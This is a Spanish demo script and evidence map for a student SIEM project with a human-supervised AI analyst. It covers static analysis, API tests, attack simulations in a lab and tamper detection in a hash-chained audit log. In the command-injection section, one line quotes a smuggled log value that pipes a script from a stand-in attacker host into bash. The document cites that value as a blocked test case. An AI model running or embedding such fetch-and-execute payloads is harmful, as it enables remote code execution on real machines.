# Guion de demostración y mapa de evidencia

> Para la defensa oral y el informe. Cada objetivo de la materia con el comando
> exacto que lo demuestra, qué tiene que verse, y dónde está la evidencia escrita.
>
> **Verificado el 17-09-2026.** Todas las salidas de este documento son reales.

---

## 0. Preparación — leer esto antes de la defensa

> ⚠️ **El riesgo más probable de la demo.** El pipeline analiza una ventana de
> **24 horas**. Si nadie corre una simulación antes, el panel se ve **vacío**, con
> el stack perfectamente sano. Pasó al verificar esta auditoría: 7 364 documentos
> ingeridos, 7 alertas, y aun así **0 incidentes**, porque eran de días anteriores.

```bash
cd /home/test/Descargas/SIEM-IA-main/Elastic-SIEM-Project

./scripts/start.sh      # stack + reglas (si no está arriba)
./scripts/demo.sh       # ← TODO lo demás, con un comando
python3 dashboard.py    # → http://127.0.0.1:5000/login
```

`demo.sh` hace el diagnóstico, crea los usuarios, despliega las reglas, genera
los tres ataques, **espera a que las reglas disparen**, corre el pipeline e
imprime el guion completo. Si algo falta, aborta con un mensaje que dice qué.

Para comprobar el estado sin tocar nada (útil cinco minutos antes de empezar):

```bash
./scripts/demo.sh --estado
```

Checklist de 60 segundos antes de empezar:

- [ ] `./scripts/demo.sh --estado` termina en **"Listo para demostrar"**
- [ ] El panel abre en `/login` y entra con `analista`
- [ ] `./scripts/check.sh` termina en **verde**

---

> **Para llevar la evidencia por escrito:** `./scripts/evidencia.sh` deja una carpeta
> `evidencia/<fecha>/` con las salidas **crudas** de cada herramienta —incluida la
> inyección de una vulnerabilidad real y las nueve peticiones de servicio con su
> respuesta— más un `00-resumen.md` que explica qué prueba cada archivo. Sirve para
> adjuntar a un informe y como respaldo si la demostración en vivo falla.

## 1. Objetivo 1 · Pruebas de código estático

### Qué mostrar

```bash
./scripts/check.sh --sast
```

**Qué tiene que verse:**

```
══ Análisis estático (SAST) ══
  ruff · tests/                    OK
  ruff · proyecto                  BASE   0 hallazgo(s) conocido(s), sin regresiones
  pylint + secure-coding-standard   OK
  bandit · severidad alta          BASE   0 hallazgo(s) conocido(s), sin regresiones
  eslint + security                 OK
```

### Qué contar mientras corre

**Cuatro herramientas, dos de ellas pedidas explícitamente:**

| Herramienta | Rol |
|-------------|-----|
| `pylint` + **`pylint-secure-coding-standard`** | Reglas de desarrollo seguro: prohíbe `os.system`, exige `check=` en `subprocess`, controla permisos de archivo |
| `bandit` | SAST específico de seguridad |
| `ruff` | Estilo y errores, en menos de un segundo |
| `eslint` + **`eslint-plugin-security`** + `no-unsanitized` | Análisis del JavaScript del panel |

**Lo que hace que esto sea una demostración y no una captura de pantalla: se
probó que las herramientas detectan.** Se inyectaron violaciones reales y se
verificó que la puerta las encuentra. Se puede reproducir en vivo:

```bash
# Inyectar un hash débil en siem_lib.py
printf '\n\ndef _demo(x):\n    import hashlib\n    return hashlib.md5(x).hexdigest()\n' >> siem_lib.py
./scripts/check.sh --sast
#   ruff · proyecto     FALLA  1 hallazgos (línea de base: 0) — hay 1 nuevo(s)
#   bandit · sev. alta  FALLA  1 hallazgos (línea de base: 0) — hay 1 nuevo(s)

git checkout siem_lib.py   # o revertir a mano
```

**Hallazgos reales que el SAST encontró en este proyecto:**

| Hallazgo | Dónde | Qué se hizo |
|----------|-------|-------------|
| `B324` · SHA-1 débil (×2) | `classifier.py` | Pasó a SHA-256 con `usedforsecurity=False` |
| `R8005` · `open()` sin modo explícito (×2) | `siem_lib.py` | `os.open` con modo `0600` |
| `W1510` · `subprocess.run` sin `check=` | `siem_pipeline.py` | `check=False` explícito |

> El caso más elocuente es `R8005`: el plugin de seguridad señaló por su cuenta
> `write_json` y `append_jsonl` —el escritor del registro de auditoría— sin estar
> configurado para eso. Confirmó de forma independiente que había que endurecerlo.

### Análisis estático propio

Además de los linters, el proyecto tiene un **análisis estático a medida** que
hace cumplir una propiedad del producto:

```bash
.devtools/bin/pytest tests/test_no_autonomy.py -q -s | head -20
```

```
── Certificación de no-autonomía ──────────────────────────
Archivos .py analizados por AST : 9
Con import de subprocess        : ['siem_pipeline.py']
Allowlist                       : ['siem_pipeline.py']
Rutas HTTP que ejecutan algo    : ninguna
Herramientas del LLM            : ninguna
───────────────────────────────────────────────────────────
```

34 pruebas recorren el **árbol de sintaxis** de los 9 módulos. Se analiza el AST
y no el texto porque un `grep` se engaña con un comentario y se lo esquiva con
`getattr(os, "sys" + "tem")`.

**Probado contra 4 mutantes reales**, todos detectados:

| Mutación | Detectada por |
|----------|---------------|
| `os.system()` dentro de `api_decision` | `dashboard.py:103: os.system(...)` |
| `getattr(os, 'system')` disfrazado | `classifier.py:29: getattr(..., 'system')` |
| `import paramiko` | `siem_agent.py:25: import paramiko` |
| Ruta `POST /api/execute` | Dos pruebas distintas |

### Evidencia escrita

`docs/12-registro-de-pruebas.md` §3 · `docs/11-reporte-fase-0.md` §5

---

## 2. Objetivo 2 · Pruebas de servicio

### Qué mostrar

```bash
.devtools/bin/pytest tests/integration -q
```

```
111 passed in 3.2s
```

### Qué contar

**Son pruebas de servicio de verdad, no unitarias disfrazadas:** ejercitan la
aplicación Flask corriendo, lanzan `audit_verify.py` como proceso, ejecutan el
`reset.sh` real contra un sandbox y corren 20 hilos concurrentes contra el
registro de auditoría.

| Suite | Pruebas | Qué ejercita |
|-------|--------:|--------------|
| `test_api_v1.py` | 38 | Las 10 rutas: 200/201/400/404, validación de tipos y límites, `Cache-Control`, errores siempre en JSON |
| `test_a02_a04_integridad.py` | 35 | Cadena de hash, 20 escrituras concurrentes, `audit_verify.py` como proceso |
| `test_api_caracterizacion.py` | 19 | Contrato histórico y compatibilidad de rutas |
| `test_a01_reset_preserva_auditoria.py` | 12 | El script `reset.sh` real, con un `docker` de juguete |
| `test_auditoria_append_only.py` | 7 | Invariantes del registro; lanza `siem_agent.py` real |

### Demostración en vivo del endpoint

> Verificado contra el servidor real el 25-09-2026. Las salidas de abajo son las
> que devuelve, no un ejemplo escrito de memoria.

**Lo único público es el diagnóstico de salud:**

```bash
python3 dashboard.py &    # en otra terminal

curl -s localhost:5000/api/v1/healthz
#   {"incidents_file":true,"status":"ok"}

curl -s -o /dev/null -w '%{http_code}\n' localhost:5000/api/v1/incidents
#   401 — sin sesión no se ve nada. Eso es API-01 funcionando.
```

**Con sesión, hay que traer el token CSRF.** Las credenciales de abajo son las de
los usuarios de laboratorio que crea `./scripts/demo.sh` —conocidas a propósito, para
poder presentar— y no sirven para nada fuera de este entorno. Los secretos reales
(`ELASTIC_PASSWORD`, `GEMINI_API_KEY`) viven en `.env`, que no se versiona.

**Con sesión, hay que traer el token CSRF:**

```bash
TOK=$(curl -s -c jar -X POST localhost:5000/api/v1/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"analista","password":"Soc-Analista-2026"}' \
     | python3 -c 'import sys,json; print(json.load(sys.stdin)["csrf_token"])')
#   El login devuelve además: rol, permisos, y la política de expiración
#   {"rol":"analyst","permisos":["decidir","ver_auditoria","ver_incidentes"],
#    "expira_como_maximo_en_horas":8,"expira_por_inactividad_en_minutos":30,...}
```

**Un POST sin el token no pasa, aunque la sesión sea válida:**

```bash
curl -s -b jar -X POST localhost:5000/api/v1/decision \
     -H 'Content-Type: application/json' \
     -d '{"incident_id":"INC-INVENTADO","action_id":"x","decision":"approved"}'
#   403 {"error":"token CSRF inválido o ausente: The CSRF token is missing."}
```

**Con el token, la validación de entrada responde en JSON y no escribe nada:**

```bash
curl -s -b jar -H "X-CSRFToken: $TOK" -X POST localhost:5000/api/v1/decision \
     -H 'Content-Type: application/json' \
     -d '{"incident_id":"INC-INVENTADO","action_id":"x","decision":"approved"}'
#   404 {"error":"no existe la acción 'x' en el incidente 'INC-INVENTADO'"}
#   Y NO se escribió nada en el registro inmutable.

curl -s -b jar -H "X-CSRFToken: $TOK" -X POST localhost:5000/api/v1/decision \
     -H 'Content-Type: application/json' -d '{roto'
#   400 {"error":"se esperaba un cuerpo JSON"}   ← JSON, no el HTML de Werkzeug
```

**El permiso se verifica por ruta, y el analista no es auditor:**

```bash
curl -s -b jar localhost:5000/api/v1/audit/verify
#   403 {"error":"el rol 'analyst' no tiene permiso para 'verificar_cadena'",
#        "permiso_requerido":"verificar_cadena"}

curl -s -c jar-aud -X POST localhost:5000/api/v1/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"auditor","password":"Soc-Auditor-2026"}' >/dev/null
curl -s -b jar-aud localhost:5000/api/v1/audit/verify
#   200 {"chain_ok":true,"estado":"ok","first_broken":null,"records":28,
#        "reason":"27 registro(s) heredados al inicio; los 1 siguientes verifican bien"}
```

**Y la inversa, que es la que conviene mostrar:** el auditor **no** puede decidir.

```bash
curl -s -b jar-aud -X POST localhost:5000/api/v1/decision ...
#   403 {"error":"el rol 'auditor' no tiene permiso para 'decidir'",
#        "permiso_requerido":"decidir"}
```

> Lo que hay que decir: los tres roles se diferencian en **qué pueden ver y
> decidir**. Ninguno puede ejecutar una acción de contención — no es un permiso
> que falte en la tabla, es una capacidad que no existe en el sistema.

### Dos defectos reales que encontraron estas pruebas

1. **Coerción silenciosa de tipos.** `data.get("note") or ""` convertía `[]` y
   `{}` en cadena vacía por ser *falsy*, saltándose el chequeo de tipo. Se
   corrigió el código, no la prueba.
2. **Una alerta que mentía.** `audit_verify.py` reportaba *"CADENA ROTA · el
   registro fue modificado"* para los 27 registros anteriores al encadenado.
   Falso y contraproducente: una alerta que siempre aparece y siempre es falso
   positivo enseña a ignorar la herramienta — el mismo *alert fatigue* que el
   proyecto entero intenta evitar. Ahora distingue `ok` / `heredado` / `roto`.

### Evidencia escrita

`docs/12-registro-de-pruebas.md` §4

---

## 3. Objetivo 3 · Entorno de simulación

### Qué mostrar — la cadena completa

```bash
# 1. El stack
docker compose ps
#   elasticsearch  Up (healthy)   kibana  Up   logstash  Up   filebeat  Up

# 2. La ingesta real
curl -s -u elastic:$ELASTIC_PASSWORD \
     'localhost:9200/_cat/indices/filebeat-*?v&h=index,docs.count'
#   filebeat-8.12.2-2026.09.16   7364

# 3. Un ataque
bash simulation/run-port-scan.sh --offline
#   [+] 26 eventos escritos en network_logs/port-scan-<ts>.json

# 4. Detección y análisis
python3 siem_pipeline.py
```

**Qué tiene que verse:**

```
[Agente 1 - Clasificador] Aplicando reglas determinísticas...
  Incidentes detectados: 3
   • INC-AUTH-203.0.113.77-a4a68599: ssh_brute_force [ALTA] — 24 eventos
   • INC-SCAN-203.0.113.77-f1b2a849: port_scan [ALTA] — 16 eventos
   • INC-PHISH-172.18.0.9-2959d492: credential_harvesting [ALTA] — 1 eventos

🔍 Agente 2 — Analista LLM        (modo: fallback)
[OK] Corrida registrada en 'analysis_history.jsonl'
```

```bash
# 5. La supervisión humana
python3 dashboard.py     # → http://127.0.0.1:5000
```

En el panel: aprobar una acción, ver el estado cambiar, recargar y ver que
persiste.

```bash
# 6. La auditoría verificable
python3 audit_verify.py
#   ✅ decisions.jsonl
#      Cadena intacta · N registro(s)
#      Analistas: analista-soc
```

### El ataque en vivo, mientras el tribunal mira

La cadena de arriba muestra un **resultado**. Esto muestra el **proceso**, y es la
diferencia entre demostrar detección y mostrar un archivo JSON:

```bash
# Con el panel proyectado, en otra terminal:
./scripts/demo-ataque.sh campana
```

Va narrado y con pausas, para poder hablar mientras corre. Lanza un escaneo de
puertos (T1046) y después una captura de credenciales (T1566) **desde la misma IP**,
y el sistema los cruza en una campaña: lee el reconocimiento y la explotación como
UNA operación, no como dos eventos sueltos.

Usa una IP nueva en cada corrida, en el rango `198.51.100.0/24` que RFC 5737 reserva
para documentación, así el incidente nuevo se distingue de un vistazo de los que ya
están en el panel. El panel se refresca solo cada 15 segundos: aparece sin tocar nada.

```
port_scan              alta       26 ev   198.51.100.216    🔗 CAMP-fcfeab8d
credential_harvesting  alta        1 ev   198.51.100.216    🔗 CAMP-fcfeab8d

✔ 2 incidente(s) nuevo(s) — buscá la IP 198.51.100.216 en el panel.
```

Otros modos: `port-scan`, `phishing`, y `fuerza-bruta` —este último es Hydra real
por SSH, los intentos pasan por Filebeat → Logstash → Elasticsearch, la misma ruta
que un ataque de verdad, y necesita los contenedores de simulación levantados.

**Lo que hay que decir en voz alta:** el script *genera ataques* contra el
laboratorio del propio proyecto y corre la detección. No ejecuta ninguna acción de
contención, y hay una prueba por script que lo verifica.

### La demostración que más impacta

**Mostrar que el registro detecta manipulación.** Un comando:

```bash
./scripts/demo-auditoria.sh
```

Copia `decisions.jsonl`, altera una decisión real aprobada para que diga
"descartada", y corre el verificador del proyecto sin decirle nada:

```
❌ /tmp/…/decisions.jsonl
   CADENA ROTA en la línea 29 (de 29 leída/s)
   Motivo: prev_hash no coincide: el registro anterior fue modificado o eliminado

   Qué significa: el registro de auditoría fue modificado después de escribirse.
   Qué hacer: preservar el archivo como evidencia y escalar el hallazgo.

✔ código de salida 1 — la manipulación se detectó
```

Ese **1** es lo que hace fallar la puerta de calidad: la detección no depende de que
alguien mire la pantalla.

> ⚠️ **No editar `decisions.jsonl` a mano para esto.** Es el registro de auditoría
> del equipo y no hay forma prolija de deshacer el cambio. El script trabaja sobre
> una copia en un directorio temporal y, al terminar, imprime el SHA-256 del archivo
> real antes y después para probar que no lo tocó.

**Lo que conviene decir, y es la parte que más se recuerda:** el registro no es
imposible de editar —cualquiera con permisos de escritura puede—, es **detectable**,
y eso es lo que lo hace servir como evidencia.

**Y si preguntan por el último registro:** un encadenado protege cada línea a través
de la **siguiente**, así que el último eslabón queda expuesto hasta que otro lo cubre.
Por eso el script agrega dos decisiones antes de alterar una. Es una propiedad del
mecanismo, no de esta implementación, y hay una prueba que la deja escrita
(`test_alterar_el_ultimo_registro_no_es_detectable`). Cerrarla requiere un ancla
externa —publicar el hash de cierre en otro sistema—, que hoy no está.

### Y la que responde la pregunta difícil

*"¿Y si la IA se equivoca y bloquea algo que no debía?"*

```bash
# El sistema NO PUEDE ejecutar nada. Se demuestra, no se afirma:
grep -rn "subprocess\|os.system\|eval(" --include=*.py . | grep -v tests/
#   siem_pipeline.py:18  import subprocess
#   siem_pipeline.py:38  result = subprocess.run(cmd, check=False)

sed -n '21,25p' siem_pipeline.py
#   STEPS = [ ... [sys.executable, "prepare-for-ia.py"] ... ]
#   Lista literal de las 3 etapas del propio pipeline. Sin shell. Sin datos de log.
```

Y la inyección de comandos, que sí era un riesgo real y está cerrada:

```bash
.devtools/bin/pytest tests/unit/test_s01_inyeccion_comandos.py -q
#   57 passed
```

Un `username` de log que vale `victima; curl http://atacante/x.sh | bash` **no
produce ningún comando**: la acción se omite. El sistema nunca ejecutó nada, pero
antes le entregaba al analista un comando armado por el atacante para que lo
copiara en una terminal con `sudo`.

### Lo que hay que declarar con honestidad

| Limitación | Cómo decirlo |
|------------|--------------|
| El umbral de fuerza bruta desplegado (3) no coincide con el del catálogo (10) | "Es una discrepancia identificada entre `rules/rules.md` y la regla A2 desplegada. Está registrada, no descubierta en la defensa." |
| La ERS no refleja lo implementado | "16 requisitos están cumplidos y todavía marcados como pendientes. La actualización es la tarea P11." |
| El LLM no se usa | "La cuota de Gemini está agotada. El respaldo determinístico cubre el 100 % del flujo, y esa degradación garantizada es un requisito cumplido (`RNF-CONF-04`), no una falla." |
| Sin pruebas de navegador | "La interfaz se verifica por su HTML servido y ejecutando su `esc()` en Node. El E2E depende de extraer el JavaScript." |

> Declarar una limitación con su identificador de requisito y su plan es más
> fuerte que omitirla. La ERS ya adopta ese criterio con las marcas [I]/[P]/[D].

---

## 4. Mapa de evidencia

| Qué se quiere mostrar | Dónde está |
|-----------------------|------------|
| Estado real del proyecto, qué falla, qué falta | `docs/auditoria/01-auditoria-integral.md` |
| Plan completo con los 25 hallazgos identificados | `docs/10-plan-de-accion.md` |
| Cómo se construyó la red de seguridad | `docs/11-reporte-fase-0.md` |
| Qué se verifica y qué dio, fase por fase | `docs/12-registro-de-pruebas.md` |
| Certificación de no-autonomía | `tests/test_no_autonomy.py` + `docs/11` §4 |
| Arquitectura y flujo de datos | `docs/01-arquitectura.md`, `docs/06-flujo-de-datos.md` |
| Catálogo de 13 reglas de detección | `rules/rules.md` |
| Cómo levantar todo desde cero | `docs/08-puesta-en-marcha-paso-a-paso.md` |
| El panel explicado con capturas reales | `docs/09-dashboard.md` + `screenshots/` |
| Autenticación, sesiones y roles | `docs/15-autenticacion-y-roles.md` |
| Detección como código, las 13 reglas versionadas | `rules/ndjson/` + `./scripts/deploy-rules.sh` |
| Dejar el laboratorio listo para la defensa | `./scripts/demo.sh` (y `--estado` para diagnosticar) |
| **La evidencia de los objetivos 1 y 2, por escrito** | `./scripts/evidencia.sh` → `evidencia/<fecha>/` |
| **La demostración completa, desde cero** | `./scripts/demo-desde-cero.sh` + [`../16-demostracion-desde-cero.md`](../16-demostracion-desde-cero.md) |
| Un ataque en vivo, delante del tribunal | `./scripts/demo-ataque.sh campana` |
| Requisitos formales y su estado | `Grupo4-ERS.docx` (actualizar, ver P11) |

**Capturas disponibles:** 19 en `screenshots/` (panel, evidencia, campañas,
supervisión, reglas en Kibana, alertas) y 6 en `images/` (arquitectura,
topología).

---

## 5. Preguntas probables y cómo responderlas

| Pregunta | Respuesta corta | Evidencia |
|----------|-----------------|-----------|
| *¿Cómo sé que el análisis estático sirve de algo?* | Se inyectaron violaciones reales y la puerta las detectó. Se puede reproducir en vivo. | §1 de este documento |
| *¿Qué pasa si la IA alucina un comando?* | No puede: los comandos salen de un catálogo fijo en `classifier.py`, y el LLM no tiene *function calling*. Hay una prueba con un LLM hostil simulado. | `test_el_analisis_del_llm_no_sobreescribe_el_playbook` |
| *¿Y si un atacante inyecta contenido en los logs?* | Se valida con lista blanca. Si no valida, la acción se omite. | `tests/unit/test_s01_inyeccion_comandos.py` |
| *¿El registro es realmente inmutable?* | No es inmutable: es **verificable**. Cada línea encadena el SHA-256 de la anterior, así que alterar una es detectable. Se rompe en vivo, sobre una copia. | `./scripts/demo-auditoria.sh` |
| *¿Y si alteran el último registro?* | No se detecta: el encadenado protege a través del eslabón siguiente. Hace falta un ancla externa, que hoy no está. Está probado y escrito. | `test_alterar_el_ultimo_registro_no_es_detectable` |
| *¿Cuánta cobertura tienen?* | 95 % sobre el alcance declarado (800 pruebas, ~100 s), pero lo que importa es que las pruebas **encontraron defectos reales que el plan no había previsto** — entre ellos D-01 y D-02, que habrían hecho acusar a la víctima de un ataque. | `docs/12` §4.9–§4.12 |
| *¿Por qué el umbral es 20 y no otro?* | **Pendiente (P9).** Hoy es una constante sin fundamento escrito. | `docs/13` (por escribir) |
| *¿Puedo reproducir el entorno desde cero?* | Sí, con un comando: `./scripts/start.sh` levanta el stack y despliega las **13 reglas versionadas**. Las reglas son código, en `rules/ndjson/`. | `docs/12` §4.8, `rules/rules.md` |
| *¿Cómo demuestran detección y no una pantalla ya cargada?* | Se pone **todo en cero** delante del tribunal —0 reglas, 0 alertas, 0 documentos, 0 incidentes— y se construye el resultado paso a paso, recargando el navegador en cada uno. | `./scripts/demo-desde-cero.sh`, `docs/16` |
| *¿Todo lo que aparece sale de las reglas que desplegaron?* | **No, y es deliberado.** La fuerza bruta la confirma una regla del SIEM y el panel la nombra; el escaneo y el phishing los detecta el Agente 1 leyendo los logs de red, sin pasar por Elasticsearch. La detección no depende de un solo motor. | `docs/16` §4, `docs/12` §4.19 |
| *¿Y la autenticación?* | Hay login, sesiones con expiración y tres roles. Ningún rol puede ejecutar acciones de contención: no es un permiso que falte, es una capacidad que no existe. | `docs/15-autenticacion-y-roles.md` |
| *¿Quién firma cada decisión?* | Hoy, una variable de entorno. Es la brecha principal y la primera tarea del plan. | Auditoría §3.1, F-01 |
